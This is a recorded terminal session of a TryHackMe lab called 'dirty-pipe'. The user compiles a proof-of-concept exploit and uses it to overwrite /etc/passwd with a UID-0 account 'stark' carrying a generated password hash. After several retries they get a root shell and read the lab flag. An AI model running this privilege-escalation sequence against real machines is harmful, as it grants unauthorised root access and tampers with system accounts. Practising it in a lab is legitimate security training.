@@ -1,0 +1,178 @@
+Script started on 2025-03-25 17:51:36+03:00 [COMMAND="ssh tryhackme@10.10.187.147" TERM="xterm-256color" TTY="/dev/pts/0" COLUMNS="41" LINES="22"]
+The authenticity of host '10.10.187.147 (10.10.187.147)' can't be established.
+ED25519 key fingerprint is SHA256:WxaHGMgszwtT0fa6RemISFnAlevpeOUEWIvLwdOMF6s.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.187.147' (ED25519) to the list of known hosts.
+tryhackme@10.10.187.147's password: 
+
+
+	 _____           _   _            _    __  __      
+	|_   _| __ _   _| | | | __ _  ___| | _|  \/  | ___ 
+	  | || '__| | | | |_| |/ _` |/ __| |/ / |\/| |/ _ \
+	  | || |  | |_| |  _  | (_| | (__|   <| |  | |  __/
+	  |_||_|   \__, |_| |_|\__,_|\___|_|\_\_|  |_|\___|
+	           |___/                                   
+
+
+
+]0;tryhackme@dirty-pipe: ~[01;32mtryhackme@dirty-pipe[00m:[01;34m~[00m$ ls
+[0m[01;34mExploit[0m
+]0;tryhackme@dirty-pipe: ~[01;32mtryhackme@dirty-pipe[00m:[01;34m~[00m$ [K]0;tryhackme@dirty-pipe: ~[01;32mtryhackme@dirty-pipe[00m:[01;34m~[00m$ [K]0;tryhackme@dirty-pipe: ~[01;32mtryhackme@dirty-pipe[00m:[01;34m~[00m$ [K]0;tryhackme@dirty-pipe: ~[01;32mtryhackme@dirty-pipe[00m:[01;34m~[00m$ [K]0;tryhackme@dirty-pipe: ~[01;32mtryhackme@dirty-pipe[00m:[01;34m~[00m$ openssl passwd -6 --salt THM "PASSWORD"
+$6$THM$MeGI7eYSh.ex3l79m8sMQ2dq9Ux77JfC7XlCgZbneUFAvnHj4gphJKnnveuf2AndcoLn2mmhJVhcxvAIgA8RJ.
+]0;tryhackme@dirty-pipe: ~[01;32mtryhackme@dirty-pipe[00m:[01;34m~[00m$ [K]0;tryhackme@dirty-pipe: ~[01;32mtryhackme@dirty-pipe[00m:[01;34m~[00m$ [K]0;tryhackme@dirty-pipe: ~[01;32mtryhackme@dirty-pipe[00m:[01;34m~[00m$ [K]0;tryhackme@dirty-pipe: ~[01;32mtryhackme@dirty-pipe[00m:[01;34m~[00m$ [K]0;tryhackme@dirty-pipe: ~[01;32mtryhackme@dirty-pipe[00m:[01;34m~[00m$ grep -b "games" /etc/passwd
+[32m[K189[m[K[36m[K:[m[K[01;31m[Kgames[m[K:x:5:60:[01;31m[Kgames[m[K:/usr/[01;31m[Kgames[m[K:/usr/sbin/nologin
+]0;tryhackme@dirty-pipe: ~[01;32mtryhackme@dirty-pipe[00m:[01;34m~[00m$ [K]0;tryhackme@dirty-pipe: ~[01;32mtryhackme@dirty-pipe[00m:[01;34m~[00m$ [K]0;tryhackme@dirty-pipe: ~[01;32mtryhackme@dirty-pipe[00m:[01;34m~[00m$ [K]0;tryhackme@dirty-pipe: ~[01;32mtryhackme@dirty-pipe[00m:[01;34m~[00m$ [K]0;tryhackme@dirty-pipe: ~[01;32mtryhackme@dirty-pipe[00m:[01;34m~[00m$ [K]0;tryhackme@dirty-pipe: ~[01;32mtryhackme@dirty-pipe[00m:[01;34m~[00m$ cd Exploit/PoC/
+]0;tryhackme@dirty-pipe: ~/Exploit/PoC[01;32mtryhackme@dirty-pipe[00m:[01;34m~/Exploit/PoC[00m$ ls
+poc.c
+]0;tryhackme@dirty-pipe: ~/Exploit/PoC[01;32mtryhackme@dirty-pipe[00m:[01;34m~/Exploit/PoC[00m$ [K]0;tryhackme@dirty-pipe: ~/Exploit/PoC[01;32mtryhackme@dirty-pipe[00m:[01;34m~/Exploit/PoC[00m$ [K]0;tryhackme@dirty-pipe: ~/Exploit/PoC[01;32mtryhackme@dirty-pipe[00m:[01;34m~/Exploit/PoC[00m$ [K]0;tryhackme@dirty-pipe: ~/Exploit/PoC[01;32mtryhackme@dirty-pipe[00m:[01;34m~/Exploit/PoC[00m$ [K]0;tryhackme@dirty-pipe: ~/Exploit/PoC[01;32mtryhackme@dirty-pipe[00m:[01;34m~/Exploit/PoC[00m$ [K]0;tryhackme@dirty-pipe: ~/Exploit/PoC[01;32mtryhackme@dirty-pipe[00m:[01;34m~/Exploit/PoC[00m$ gcc poc.c -o exploit
+]0;tryhackme@dirty-pipe: ~/Exploit/PoC[01;32mtryhackme@dirty-pipe[00m:[01;34m~/Exploit/PoC[00m$ ls
+[0m[01;32mexploit[0m  poc.c
+]0;tryhackme@dirty-pipe: ~/Exploit/PoC[01;32mtryhackme@dirty-pipe[00m:[01;34m~/Exploit/PoC[00m$ [K]0;tryhackme@dirty-pipe: ~/Exploit/PoC[01;32mtryhackme@dirty-pipe[00m:[01;34m~/Exploit/PoC[00m$ [K]0;tryhackme@dirty-pipe: ~/Exploit/PoC[01;32mtryhackme@dirty-pipe[00m:[01;34m~/Exploit/PoC[00m$ [K]0;tryhackme@dirty-pipe: ~/Exploit/PoC[01;32mtryhackme@dirty-pipe[00m:[01;34m~/Exploit/PoC[00m$ [K]0;tryhackme@dirty-pipe: ~/Exploit/PoC[01;32mtryhackme@dirty-pipe[00m:[01;34m~/Exploit/PoC[00m$ [K]0;tryhackme@dirty-pipe: ~/Exploit/PoC[01;32mtryhackme@dirty-pipe[00m:[01;34m~/Exploit/PoC[00m$ cp /etc/passwd /tmp/passwd
+]0;tryhackme@dirty-pipe: ~/Exploit/PoC[01;32mtryhackme@dirty-pipe[00m:[01;34m~/Exploit/PoC[00m$ [K]0;tryhackme@dirty-pipe: ~/Exploit/PoC[01;32mtryhackme@dirty-pipe[00m:[01;34m~/Exploit/PoC[00m$ [K]0;tryhackme@dirty-pipe: ~/Exploit/PoC[01;32mtryhackme@dirty-pipe[00m:[01;34m~/Exploit/PoC[00m$ [K]0;tryhackme@dirty-pipe: ~/Exploit/PoC[01;32mtryhackme@dirty-pipe[00m:[01;34m~/Exploit/PoC[00m$ [K]0;tryhackme@dirty-pipe: ~/Exploit/PoC[01;32mtryhackme@dirty-pipe[00m:[01;34m~/Exploit/PoC[00m$ ls -l [A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Kl
+total 28
+-rwxrwxr-x 1 tryhackme tryhackme 17464 Mar 25 14:55 [0m[01;32mexploit[0m
+-rw-r--r-- 1 tryhackme tryhackme  4371 Mar 13  2022 poc.c
+]0;tryhackme@dirty-pipe: ~/Exploit/PoC[01;32mtryhackme@dirty-pipe[00m:[01;34m~/Exploit/PoC[00m$ [K]0;tryhackme@dirty-pipe: ~/Exploit/PoC[01;32mtryhackme@dirty-pipe[00m:[01;34m~/Exploit/PoC[00m$ [K]0;tryhackme@dirty-pipe: ~/Exploit/PoC[01;32mtryhackme@dirty-pipe[00m:[01;34m~/Exploit/PoC[00m$ [K]0;tryhackme@dirty-pipe: ~/Exploit/PoC[01;32mtryhackme@dirty-pipe[00m:[01;34m~/Exploit/PoC[00m$ [K]0;tryhackme@dirty-pipe: ~/Exploit/PoC[01;32mtryhackme@dirty-pipe[00m:[01;34m~/Exploit/PoC[00m$ [K]0;tryhackme@dirty-pipe: ~/Exploit/PoC[01;32mtryhackme@dirty-pipe[00m:[01;34m~/Exploit/PoC[00m$ ./exploit /etc/passwd 189 'stark:$6$THM$MeGI7eYSh.ex3l79m8sMQ2dq9Ux77JfC7XlCgZbneUFAvnHj4gphJKnnveuf2AndcoLn2mmhJVhcxvAIgA8RJ.:0:0::/root:/bin/bash'
+It worked!
+]0;tryhackme@dirty-pipe: ~/Exploit/PoC[01;32mtryhackme@dirty-pipe[00m:[01;34m~/Exploit/PoC[00m$ [K]0;tryhackme@dirty-pipe: ~/Exploit/PoC[01;32mtryhackme@dirty-pipe[00m:[01;34m~/Exploit/PoC[00m$ [K]0;tryhackme@dirty-pipe: ~/Exploit/PoC[01;32mtryhackme@dirty-pipe[00m:[01;34m~/Exploit/PoC[00m$ [K]0;tryhackme@dirty-pipe: ~/Exploit/PoC[01;32mtryhackme@dirty-pipe[00m:[01;34m~/Exploit/PoC[00m$ [K]0;tryhackme@dirty-pipe: ~/Exploit/PoC[01;32mtryhackme@dirty-pipe[00m:[01;34m~/Exploit/PoC[00m$ [K]0;tryhackme@dirty-pipe: ~/Exploit/PoC[01;32mtryhackme@dirty-pipe[00m:[01;34m~/Exploit/PoC[00m$ su st ark
+su: user stark does not exist
+]0;tryhackme@dirty-pipe: ~/Exploit/PoC[01;32mtryhackme@dirty-pipe[00m:[01;34m~/Exploit/PoC[00m$ su
+Password: 
+su: Authentication failure
+]0;tryhackme@dirty-pipe: ~/Exploit/PoC[01;32mtryhackme@dirty-pipe[00m:[01;34m~/Exploit/PoC[00m$ [K]0;tryhackme@dirty-pipe: ~/Exploit/PoC[01;32mtryhackme@dirty-pipe[00m:[01;34m~/Exploit/PoC[00m$ [K]0;tryhackme@dirty-pipe: ~/Exploit/PoC[01;32mtryhackme@dirty-pipe[00m:[01;34m~/Exploit/PoC[00m$ [K]0;tryhackme@dirty-pipe: ~/Exploit/PoC[01;32mtryhackme@dirty-pipe[00m:[01;34m~/Exploit/PoC[00m$ [K]0;tryhackme@dirty-pipe: ~/Exploit/PoC[01;32mtryhackme@dirty-pipe[00m:[01;34m~/Exploit/PoC[00m$ [K]0;tryhackme@dirty-pipe: ~/Exploit/PoC[01;32mtryhackme@dirty-pipe[00m:[01;34m~/Exploit/PoC[00m$ cat / etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
+syslog:x:104:110::/home/syslog:/usr/sbin/nologin
+_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
+uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
+sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
+landscape:x:110:115::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:111:1::/var/cache/pollinate:/bin/false
+ec2-instance-connect:x:112:65534::/nonexistent:/usr/sbin/nologin
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
+rtkit:x:113:119:RealtimeKit,,,:/proc:/usr/sbin/nologin
+dnsmasq:x:114:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+usbmux:x:115:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+avahi:x:116:121:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
+cups-pk-helper:x:117:122:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
+geoclue:x:119:125::/var/lib/geoclue:/usr/sbin/nologin
+saned:x:120:127::/var/lib/saned:/usr/sbin/nologin
+colord:x:121:128:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
+gdm:x:122:129:Gnome Display Manager:/var/lib/gdm3:/bin/false
+tryhackme:x:1001:1001::/home/tryhackme:/bin/bash
+whoopsie:x:123:130::/nonexistent:/bin/false
+avahi-autoipd:x:124:132:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
+kernoops:x:125:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin
+gnome-initial-setup:x:126:65534::/run/gnome-initial-setup/:/bin/false
+speech-dispatcher:x:127:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false
+nm-openvpn:x:128:133:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin
+hplip:x:129:7:HPLIP system user,,,:/run/hplip:/bin/false
+]0;tryhackme@dirty-pipe: ~/Exploit/PoC[01;32mtryhackme@dirty-pipe[00m:[01;34m~/Exploit/PoC[00m$ [K]0;tryhackme@dirty-pipe: ~/Exploit/PoC[01;32mtryhackme@dirty-pipe[00m:[01;34m~/Exploit/PoC[00m$ [K]0;tryhackme@dirty-pipe: ~/Exploit/PoC[01;32mtryhackme@dirty-pipe[00m:[01;34m~/Exploit/PoC[00m$ [K]0;tryhackme@dirty-pipe: ~/Exploit/PoC[01;32mtryhackme@dirty-pipe[00m:[01;34m~/Exploit/PoC[00m$ [K]0;tryhackme@dirty-pipe: ~/Exploit/PoC[01;32mtryhackme@dirty-pipe[00m:[01;34m~/Exploit/PoC[00m$ [K]0;tryhackme@dirty-pipe: ~/Exploit/PoC[01;32mtryhackme@dirty-pipe[00m:[01;34m~/Exploit/PoC[00m$ [K]0;tryhackme@dirty-pipe: ~/Exploit/PoC[01;32mtryhackme@dirty-pipe[00m:[01;34m~/Exploit/PoC[00m$ [K]0;tryhackme@dirty-pipe: ~/Exploit/PoC[01;32mtryhackme@dirty-pipe[00m:[01;34m~/Exploit/PoC[00m$ [K]0;tryhackme@dirty-pipe: ~/Exploit/PoC[01;32mtryhackme@dirty-pipe[00m:[01;34m~/Exploit/PoC[00m$ [K]0;tryhackme@dirty-pipe: ~/Exploit/PoC[01;32mtryhackme@dirty-pipe[00m:[01;34m~/Exploit/PoC[00m$ [K]0;tryhackme@dirty-pipe: ~/Exploit/PoC[01;32mtryhackme@dirty-pipe[00m:[01;34m~/Exploit/PoC[00m$ [K]0;tryhackme@dirty-pipe: ~/Exploit/PoC[01;32mtryhackme@dirty-pipe[00m:[01;34m~/Exploit/PoC[00m$ [K]0;tryhackme@dirty-pipe: ~/Exploit/PoC[01;32mtryhackme@dirty-pipe[00m:[01;34m~/Exploit/PoC[00m$ [K]0;tryhackme@dirty-pipe: ~/Exploit/PoC[01;32mtryhackme@dirty-pipe[00m:[01;34m~/Exploit/PoC[00m$ [K]0;tryhackme@dirty-pipe: ~/Exploit/PoC[01;32mtryhackme@dirty-pipe[00m:[01;34m~/Exploit/PoC[00m$ [K]0;tryhackme@dirty-pipe: ~/Exploit/PoC[01;32mtryhackme@dirty-pipe[00m:[01;34m~/Exploit/PoC[00m$ [K]0;tryhackme@dirty-pipe: ~/Exploit/PoC[01;32mtryhackme@dirty-pipe[00m:[01;34m~/Exploit/PoC[00m$ [K]0;tryhackme@dirty-pipe: ~/Exploit/PoC[01;32mtryhackme@dirty-pipe[00m:[01;34m~/Exploit/PoC[00m$ [K]0;tryhackme@dirty-pipe: ~/Exploit/PoC[01;32mtryhackme@dirty-pipe[00m:[01;34m~/Exploit/PoC[00m$ [K]0;tryhackme@dirty-pipe: ~/Exploit/PoC[01;32mtryhackme@dirty-pipe[00m:[01;34m~/Exploit/PoC[00m$ [K]0;tryhackme@dirty-pipe: ~/Exploit/PoC[01;32mtryhackme@dirty-pipe[00m:[01;34m~/Exploit/PoC[00m$ [K]0;tryhackme@dirty-pipe: ~/Exploit/PoC[01;32mtryhackme@dirty-pipe[00m:[01;34m~/Exploit/PoC[00m$ [K]0;tryhackme@dirty-pipe: ~/Exploit/PoC[01;32mtryhackme@dirty-pipe[00m:[01;34m~/Exploit/PoC[00m$ [K]0;tryhackme@dirty-pipe: ~/Exploit/PoC[01;32mtryhackme@dirty-pipe[00m:[01;34m~/Exploit/PoC[00m$ [K]0;tryhackme@dirty-pipe: ~/Exploit/PoC[01;32mtryhackme@dirty-pipe[00m:[01;34m~/Exploit/PoC[00m$ [K]0;tryhackme@dirty-pipe: ~/Exploit/PoC[01;32mtryhackme@dirty-pipe[00m:[01;34m~/Exploit/PoC[00m$ [K]0;tryhackme@dirty-pipe: ~/Exploit/PoC[01;32mtryhackme@dirty-pipe[00m:[01;34m~/Exploit/PoC[00m$ [K]0;tryhackme@dirty-pipe: ~/Exploit/PoC[01;32mtryhackme@dirty-pipe[00m:[01;34m~/Exploit/PoC[00m$ [K]0;tryhackme@dirty-pipe: ~/Exploit/PoC[01;32mtryhackme@dirty-pipe[00m:[01;34m~/Exploit/PoC[00m$ [K]0;tryhackme@dirty-pipe: ~/Exploit/PoC[01;32mtryhackme@dirty-pipe[00m:[01;34m~/Exploit/PoC[00m$ [K]0;tryhackme@dirty-pipe: ~/Exploit/PoC[01;32mtryhackme@dirty-pipe[00m:[01;34m~/Exploit/PoC[00m$ [K]0;tryhackme@dirty-pipe: ~/Exploit/PoC[01;32mtryhackme@dirty-pipe[00m:[01;34m~/Exploit/PoC[00m$ [K]0;tryhackme@dirty-pipe: ~/Exploit/PoC[01;32mtryhackme@dirty-pipe[00m:[01;34m~/Exploit/PoC[00m$ [K]0;tryhackme@dirty-pipe: ~/Exploit/PoC[01;32mtryhackme@dirty-pipe[00m:[01;34m~/Exploit/PoC[00m$ [K]0;tryhackme@dirty-pipe: ~/Exploit/PoC[01;32mtryhackme@dirty-pipe[00m:[01;34m~/Exploit/PoC[00m$ [K]0;tryhackme@dirty-pipe: ~/Exploit/PoC[01;32mtryhackme@dirty-pipe[00m:[01;34m~/Exploit/PoC[00m$ cat /etc/passwd[A]0;tryhackme@dirty-pipe: ~/Exploit/PoC[01;32mtryhackme@dirty-pipe[00m:[01;34m~/Exploit/PoC[00m$ su[K
+[K[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C stark[A]0;tryhackme@dirty-pipe: ~/Exploit/PoC[01;32mtryhackme@dirty-pipe[00m:[01;34m~/Exploit/PoC[00m$ ./exploit /etc/passwd 189 'stark:$6$THM$MeGI7eYSh.ex3l79m8sMQ2dq9Ux77JfC7XlCgZbneUFAvnHj4gphJKnnveuf2AndcoLn2mmhJVhcxvAIgA8RJ.:0:0::/root:/bin/bash'[K[A[A[A[A]0;tryhackme@dirty-pipe: ~/Exploit/PoC[01;32mtryhackme@dirty-pipe[00m:[01;34m~/Exploit/PoC[00m$ ./exploit /etc/passwd 189 'stark:$6$THM$MeGI7eYSh.ex3l79m8sMQ2dq9Ux77JfC7XlCgZbneUFAvnHj4gphJKnnveuf2AndcoLn2mmhJVhcxvAIgA8RJ.:0:0::/root:/bin/bash'[K[A[A[A[A]0;tryhackme@dirty-pipe: ~/Exploit/PoC[01;32mtryhackme@dirty-pipe[00m:[01;34m~/Exploit/PoC[00m$ ./exploit /etc/passwd 189 'stark:$6$THM$MeGI7eYSh.ex3l79m8sMQ2dq9Ux77JfC7XlCgZbneUFAvnHj4gphJKnnveuf2AndcoLn2mmhJVhcxvAIgA8RJ.:0:0::/root:/bin/bash'
+It worked!
+]0;tryhackme@dirty-pipe: ~/Exploit/PoC[01;32mtryhackme@dirty-pipe[00m:[01;34m~/Exploit/PoC[00m$ su star k
+Password: 
+su: failed to execute /bin/bashpd:/usr/sbin/nologin: No such file or directory
+]0;tryhackme@dirty-pipe: ~/Exploit/PoC[01;32mtryhackme@dirty-pipe[00m:[01;34m~/Exploit/PoC[00m$ [K]0;tryhackme@dirty-pipe: ~/Exploit/PoC[01;32mtryhackme@dirty-pipe[00m:[01;34m~/Exploit/PoC[00m$ [K]0;tryhackme@dirty-pipe: ~/Exploit/PoC[01;32mtryhackme@dirty-pipe[00m:[01;34m~/Exploit/PoC[00m$ ./exploit /etc/passwd 189 'stark:$6$THM$MeGI7eYSh.ex3l79m8sMQ2dq9Ux77JfC7XlCgZbneUFAvnHj4gphJKnnveuf2AndcoLn2mmhJVhcxvAIgA8RJ.:0:0::/root:/bin/bash
+> > '[1P'[1P'
+It worked!
+]0;tryhackme@dirty-pipe: ~/Exploit/PoC[01;32mtryhackme@dirty-pipe[00m:[01;34m~/Exploit/PoC[00m$ su
+Password: 
+su: Authentication failure
+]0;tryhackme@dirty-pipe: ~/Exploit/PoC[01;32mtryhackme@dirty-pipe[00m:[01;34m~/Exploit/PoC[00m$ cat /et c/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+stark:$6$THM$MeGI7eYSh.ex3l79m8sMQ2dq9Ux77JfC7XlCgZbneUFAvnHj4gphJKnnveuf2AndcoLn2mmhJVhcxvAIgA8RJ.:0:0::/root:/bin/bash
+d:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
+syslog:x:104:110::/home/syslog:/usr/sbin/nologin
+_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
+uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
+sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
+landscape:x:110:115::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:111:1::/var/cache/pollinate:/bin/false
+ec2-instance-connect:x:112:65534::/nonexistent:/usr/sbin/nologin
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
+rtkit:x:113:119:RealtimeKit,,,:/proc:/usr/sbin/nologin
+dnsmasq:x:114:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+usbmux:x:115:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+avahi:x:116:121:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
+cups-pk-helper:x:117:122:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
+geoclue:x:119:125::/var/lib/geoclue:/usr/sbin/nologin
+saned:x:120:127::/var/lib/saned:/usr/sbin/nologin
+colord:x:121:128:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
+gdm:x:122:129:Gnome Display Manager:/var/lib/gdm3:/bin/false
+tryhackme:x:1001:1001::/home/tryhackme:/bin/bash
+whoopsie:x:123:130::/nonexistent:/bin/false
+avahi-autoipd:x:124:132:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
+kernoops:x:125:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin
+gnome-initial-setup:x:126:65534::/run/gnome-initial-setup/:/bin/false
+speech-dispatcher:x:127:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false
+nm-openvpn:x:128:133:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin
+hplip:x:129:7:HPLIP system user,,,:/run/hplip:/bin/false
+]0;tryhackme@dirty-pipe: ~/Exploit/PoC[01;32mtryhackme@dirty-pipe[00m:[01;34m~/Exploit/PoC[00m$ cat /etc/passwd | grep stark
+[01;31m[Kstark[m[K:$6$THM$MeGI7eYSh.ex3l79m8sMQ2dq9Ux77JfC7XlCgZbneUFAvnHj4gphJKnnveuf2AndcoLn2mmhJVhcxvAIgA8RJ.:0:0::/root:/bin/bash
+]0;tryhackme@dirty-pipe: ~/Exploit/PoC[01;32mtryhackme@dirty-pipe[00m:[01;34m~/Exploit/PoC[00m$ su star k
+Password: 
+]0;root@dirty-pipe: /home/tryhackme/Exploit/PoCroot@dirty-pipe:/home/tryhackme/Exploit/PoC# id
+uid=0(root) gid=0(root) groups=0(root)
+]0;root@dirty-pipe: /home/tryhackme/Exploit/PoCroot@dirty-pipe:/home/tryhackme/Exploit/PoC# cs [K[Kd /root
+]0;root@dirty-pipe: ~root@dirty-pipe:~# ls
+flag.txt
+]0;root@dirty-pipe: ~root@dirty-pipe:~# cat flag.txt
+THM{MmU4Zjg0NDdjNjFiZWM5ZjUyZGEyMzlm}
+]0;root@dirty-pipe: ~root@dirty-pipe:~# [K]0;root@dirty-pipe: ~root@dirty-pipe:~# [K]0;root@dirty-pipe: ~root@dirty-pipe:~# [K]0;root@dirty-pipe: ~root@dirty-pipe:~# [K]0;root@dirty-pipe: ~root@dirty-pipe:~# [K]0;root@dirty-pipe: ~root@dirty-pipe:~# [K]0;root@dirty-pipe: ~root@dirty-pipe:~# [K]0;root@dirty-pipe: ~root@dirty-pipe:~# [K]0;root@dirty-pipe: ~root@dirty-pipe:~# [K]0;root@dirty-pipe: ~root@dirty-pipe:~# ls -a
+[0m[01;34m.[0m   [01;36m.bash_history[0m  [01;34m.cache[0m    .profile
+[01;34m..[0m  .bashrc        flag.txt  [01;34m.ssh[0m
+]0;root@dirty-pipe: ~root@dirty-pipe:~# cd .[K[K[K[Kls .ssh
+authorized_keys
+]0;root@dirty-pipe: ~root@dirty-pipe:~# exit
+exit
+]0;tryhackme@dirty-pipe: ~/Exploit/PoC[01;32mtryhackme@dirty-pipe[00m:[01;34m~/Exploit/PoC[00m$ exit
+logout
+Connection to 10.10.187.147 closed.
+
+Script done on 2025-03-25 18:05:11+03:00 [COMMAND_EXIT_CODE="0"]
